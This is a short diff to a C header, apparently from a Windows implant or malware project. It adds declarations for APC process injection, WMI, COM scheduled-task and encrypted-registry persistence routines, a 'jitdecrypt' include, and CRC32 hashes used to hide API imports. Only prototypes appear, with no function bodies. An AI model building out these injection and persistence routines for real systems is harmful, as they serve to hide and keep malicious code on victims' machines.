@@ -2,8 +2,16 @@
 
 #include <Windows.h>
 #include <stdint.h>
+#include <taskschd.h>
+
+#pragma comment(lib, "taskschd.lib")
 
 BOOL QueueAPCInject_x64(HANDLE hProc, PVOID remoteAddr);
+#include "jitdecrypt.h"
+
+BOOL WMIPersistence();
+BOOL COMScheduledTaskPersistence();
+BOOL EncryptedRegistryPersistence();
 
 // CRC32 hashes for API functions
 #define CRC32_CREATEPROCESSW 0x16b32446
